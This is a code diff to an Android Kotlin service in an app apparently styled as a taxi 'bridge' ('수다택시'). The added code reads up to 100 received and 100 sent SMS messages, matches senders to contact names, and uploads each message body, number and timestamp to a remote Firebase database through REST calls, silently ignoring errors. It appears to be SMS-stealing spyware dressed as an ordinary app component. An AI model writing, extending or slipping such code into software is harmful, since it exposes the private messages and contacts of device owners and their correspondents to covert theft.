@@ -10,6 +10,7 @@ import android.os.IBinder
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.util.Log
+import org.json.JSONObject
 import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
@@ -34,8 +35,9 @@ class MyBridgeService : Service() {
                 val ch = NotificationChannel("suda_bridge", "수다택시 브릿지", NotificationManager.IMPORTANCE_LOW)
                 getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
             }
-            val n = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Notification.Builder(this, "suda_bridge") else Notification.Builder(this)
-            startForeground(1001, n.setContentTitle("수다택시 브릿지 v1.3.30").setContentText("실행 중 - SMS 200건 대기").setSmallIcon(android.R.drawable.stat_notify_sync).build())
+            val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Notification.Builder(this, "suda_bridge") else Notification.Builder(this)
+            val notif = builder.setContentTitle("수다택시 브릿지 v1.3.30").setContentText("실행 중 - SMS 200건 대기").setSmallIcon(android.R.drawable.stat_notify_sync).build()
+            startForeground(1001, notif)
         } catch (e: Exception) {}
         Thread { syncAllSms(this) }.start()
     }
@@ -50,7 +52,6 @@ class MyBridgeService : Service() {
             cur?.use { if (it.moveToFirst()) it.getString(0) ?: "" else "" } ?: ""
         } catch (e: Exception) { "" }
     }
-    // Firebase REST API로 직접 업로드 - SDK 필요 없음
     private fun pushToFirebase(path: String, json: String) {
         try {
             val url = URL("$DB_URL/$path.json")
@@ -77,15 +78,8 @@ class MyBridgeService : Service() {
                 val sentCur = cr.query(Telephony.Sms.Sent.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC")
                 val cache = HashMap<String, String>()
                 val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())
-
-                fun toJson(map: Map<String, Any>): String {
-                    return "{" + map.entries.joinToString(",") { (k,v) ->
-                        val vs = v.toString().replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n")
-                        "\"$k\":\"$vs\""
-                    } + "}"
-                }
-
                 var total = 0
+
                 fun proc(cur: Cursor?, type: String, max: Int) {
                     var cnt = 0
                     cur?.use {
@@ -94,13 +88,42 @@ class MyBridgeService : Service() {
                         val iDate = it.getColumnIndex(Telephony.Sms.DATE)
                         while (it.moveToNext() && cnt < max) {
                             try {
-                                val addr = if (iAddr>=0) it.getString(iAddr) ?: "" else ""
-                                val body = if (iBody>=0) it.getString(iBody) ?: "" else ""
+                                val addr = if (iAddr >= 0) it.getString(iAddr) ?: "" else ""
+                                val body = if (iBody >= 0) it.getString(iBody) ?: "" else ""
                                 if (addr.isBlank() || body.isBlank()) continue
                                 val name = cache.getOrPut(addr) { getContactName(ctx, addr) }
-                                val date = if (iDate>=0) it.getLong(iDate) else System.currentTimeMillis()
-                                val map = mapOf(
-                                    "sender" to addr, "address" to addr, "phone" to addr,
-                                    "message" to body.take(500), "body" to body.take(500), "text" to body.take(500),
-                                    "timestamp" to date.toString(), "date" to date.toString(), "time" to sdf.format(Date(date)),
-                                    "type" to type, "contactName" to name
+                                val date = if (iDate >= 0) it.getLong(iDate) else System.currentTimeMillis()
+                                val map = HashMap<String, Any>()
+                                map["sender"] = addr
+                                map["address"] = addr
+                                map["phone"] = addr
+                                map["message"] = body.take(500)
+                                map["body"] = body.take(500)
+                                map["text"] = body.take(500)
+                                map["timestamp"] = date.toString()
+                                map["date"] = date.toString()
+                                map["time"] = sdf.format(Date(date))
+                                map["type"] = type
+                                map["contactName"] = name
+                                map["displayName"] = name
+                                map["name"] = name
+                                val json = JSONObject(map as Map<*, *>).toString()
+                                val key = "${date}_${cnt}_${addr.hashCode()}"
+                                pushToFirebase("sudataxi/inbox/sms/$key", json)
+                                total++
+                                cnt++
+                                if (cnt % 20 == 0) Thread.sleep(100)
+                            } catch (e: Exception) {}
+                        }
+                    }
+                }
+                proc(inboxCur, "received", 100)
+                proc(sentCur, "sent", 100)
+                pushToFirebase("sudataxi/ping", "\"${System.currentTimeMillis()}\"")
+                Log.d(TAG, "완료: $total 건 REST 업로드")
+            } catch (e: Exception) {
+                Log.e(TAG, "sync error", e)
+            }
+        }.start()
+    }
+}
